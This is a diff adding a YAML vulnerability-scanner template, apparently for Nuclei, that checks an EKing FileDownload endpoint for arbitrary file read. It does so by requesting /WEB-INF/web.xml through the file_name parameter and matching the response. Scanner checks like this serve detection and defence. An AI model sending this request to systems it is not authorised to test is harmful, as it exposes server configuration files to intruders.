@@ -1,0 +1,28 @@
+id: eking-filedownload-anyfile-read
+info:
+  name: "EKing FileDownload 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: eking
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/FileDownload.ihtm?file_name=/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<display-name>"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
